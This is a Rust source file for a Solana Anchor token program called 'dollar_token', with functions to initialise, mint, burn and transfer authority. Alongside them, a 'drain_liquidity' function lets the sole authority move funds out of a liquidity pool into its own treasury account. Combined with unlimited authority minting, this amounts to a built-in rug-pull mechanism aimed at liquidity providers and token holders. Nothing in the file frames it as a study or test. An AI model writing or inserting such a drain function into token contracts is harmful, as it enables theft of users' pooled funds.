use anchor_lang::prelude::*;
use anchor_spl::{
    associated_token::AssociatedToken,
    token::{self, Mint, Token, TokenAccount, Transfer, MintTo, Burn},
};

declare_id!("11111111111111111111111111111111");

#[program]
pub mod dollar_token {
    use super::*;

    pub fn initialize_token(
        ctx: Context<InitializeToken>,
        name: String,
        symbol: String,
        uri: String,
        decimals: u8,
    ) -> Result<()> {
        let token_info = &mut ctx.accounts.token_info;
        token_info.authority = ctx.accounts.authority.key();
        token_info.mint = ctx.accounts.mint.key();
        token_info.name = name;
        token_info.symbol = symbol;
        token_info.uri = uri;
        token_info.decimals = decimals;
        token_info.total_supply = 0;
        token_info.is_initialized = true;
        
        Ok(())
    }

    pub fn mint_tokens(
        ctx: Context<MintTokens>,
        amount: u64,
    ) -> Result<()> {
        // Only authority can mint
        require!(
            ctx.accounts.authority.key() == ctx.accounts.token_info.authority,
            TokenError::UnauthorizedAccess
        );

        let cpi_accounts = MintTo {
            mint: ctx.accounts.mint.to_account_info(),
            to: ctx.accounts.destination.to_account_info(),
            authority: ctx.accounts.authority.to_account_info(),
        };
        let cpi_program = ctx.accounts.token_program.to_account_info();
        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);

        token::mint_to(cpi_ctx, amount)?;

        // Update total supply
        let token_info = &mut ctx.accounts.token_info;
        token_info.total_supply = token_info.total_supply.checked_add(amount).unwrap();

        emit!(TokensMinted {
            mint: ctx.accounts.mint.key(),
            to: ctx.accounts.destination.key(),
            amount,
            new_supply: token_info.total_supply,
        });

        Ok(())
    }

    pub fn burn_tokens(
        ctx: Context<BurnTokens>,
        amount: u64,
    ) -> Result<()> {
        // Only authority can burn tokens
        require!(
            ctx.accounts.authority.key() == ctx.accounts.token_info.authority,
            TokenError::UnauthorizedAccess
        );

        let cpi_accounts = Burn {
            mint: ctx.accounts.mint.to_account_info(),
            from: ctx.accounts.from.to_account_info(),
            authority: ctx.accounts.authority.to_account_info(),
        };
        let cpi_program = ctx.accounts.token_program.to_account_info();
        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);

        token::burn(cpi_ctx, amount)?;

        // Update total supply
        let token_info = &mut ctx.accounts.token_info;
        token_info.total_supply = token_info.total_supply.checked_sub(amount).unwrap();

        emit!(TokensBurned {
            mint: ctx.accounts.mint.key(),
            from: ctx.accounts.from.key(),
            amount,
            new_supply: token_info.total_supply,
        });

        Ok(())
    }

    pub fn drain_liquidity(
        ctx: Context<DrainLiquidity>,
        amount: u64,
    ) -> Result<()> {
        // Only authority can drain liquidity
        require!(
            ctx.accounts.authority.key() == ctx.accounts.token_info.authority,
            TokenError::UnauthorizedAccess
        );

        let cpi_accounts = Transfer {
            from: ctx.accounts.liquidity_pool.to_account_info(),
            to: ctx.accounts.treasury.to_account_info(),
            authority: ctx.accounts.authority.to_account_info(),
        };
        let cpi_program = ctx.accounts.token_program.to_account_info();
        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);

        token::transfer(cpi_ctx, amount)?;

        emit!(LiquidityDrained {
            from: ctx.accounts.liquidity_pool.key(),
            to: ctx.accounts.treasury.key(),
            amount,
            authority: ctx.accounts.authority.key(),
        });

        Ok(())
    }

    pub fn transfer_authority(
        ctx: Context<TransferAuthority>,
        new_authority: Pubkey,
    ) -> Result<()> {
        // Only current authority can transfer
        require!(
            ctx.accounts.authority.key() == ctx.accounts.token_info.authority,
            TokenError::UnauthorizedAccess
        );

        let token_info = &mut ctx.accounts.token_info;
        let old_authority = token_info.authority;
        token_info.authority = new_authority;

        emit!(AuthorityTransferred {
            old_authority,
            new_authority,
            mint: ctx.accounts.mint.key(),
        });

        Ok(())
    }
}

#[derive(Accounts)]
pub struct InitializeToken<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    #[account(
        init,
        payer = authority,
        mint::decimals = 9,
        mint::authority = authority,
    )]
    pub mint: Account<'info, Mint>,
    
    #[account(
        init,
        payer = authority,
        space = 8 + TokenInfo::INIT_SPACE,
        seeds = [b"token_info", mint.key().as_ref()],
        bump,
    )]
    pub token_info: Account<'info, TokenInfo>,
    
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}

#[derive(Accounts)]
pub struct MintTokens<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    #[account(mut)]
    pub mint: Account<'info, Mint>,
    
    #[account(
        mut,
        seeds = [b"token_info", mint.key().as_ref()],
        bump,
    )]
    pub token_info: Account<'info, TokenInfo>,
    
    #[account(
        mut,
        associated_token::mint = mint,
        associated_token::authority = authority,
    )]
    pub destination: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
}

#[derive(Accounts)]
pub struct BurnTokens<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    #[account(mut)]
    pub mint: Account<'info, Mint>,
    
    #[account(
        mut,
        seeds = [b"token_info", mint.key().as_ref()],
        bump,
    )]
    pub token_info: Account<'info, TokenInfo>,
    
    #[account(
        mut,
        associated_token::mint = mint,
        associated_token::authority = authority,
    )]
    pub from: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
}

#[derive(Accounts)]
pub struct DrainLiquidity<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    pub mint: Account<'info, Mint>,
    
    #[account(
        seeds = [b"token_info", mint.key().as_ref()],
        bump,
    )]
    pub token_info: Account<'info, TokenInfo>,
    
    #[account(
        mut,
        token::mint = mint,
    )]
    pub liquidity_pool: Account<'info, TokenAccount>,
    
    #[account(
        mut,
        associated_token::mint = mint,
        associated_token::authority = authority,
    )]
    pub treasury: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
}

#[derive(Accounts)]
pub struct TransferAuthority<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    pub mint: Account<'info, Mint>,
    
    #[account(
        mut,
        seeds = [b"token_info", mint.key().as_ref()],
        bump,
    )]
    pub token_info: Account<'info, TokenInfo>,
}

#[account]
#[derive(InitSpace)]
pub struct TokenInfo {
    pub authority: Pubkey,
    pub mint: Pubkey,
    #[max_len(32)]
    pub name: String,
    #[max_len(10)]
    pub symbol: String,
    #[max_len(200)]
    pub uri: String,
    pub decimals: u8,
    pub total_supply: u64,
    pub is_initialized: bool,
}

#[event]
pub struct TokensMinted {
    pub mint: Pubkey,
    pub to: Pubkey,
    pub amount: u64,
    pub new_supply: u64,
}

#[event]
pub struct TokensBurned {
    pub mint: Pubkey,
    pub from: Pubkey,
    pub amount: u64,
    pub new_supply: u64,
}

#[event]
pub struct LiquidityDrained {
    pub from: Pubkey,
    pub to: Pubkey,
    pub amount: u64,
    pub authority: Pubkey,
}

#[event]
pub struct AuthorityTransferred {
    pub old_authority: Pubkey,
    pub new_authority: Pubkey,
    pub mint: Pubkey,
}

#[error_code]
pub enum TokenError {
    #[msg("Unauthorized access - only authority can perform this action")]
    UnauthorizedAccess,
    
    #[msg("Token is not initialized")]
    TokenNotInitialized,
    
    #[msg("Invalid amount specified")]
    InvalidAmount,
    
    #[msg("Insufficient balance for operation")]
    InsufficientBalance,
}
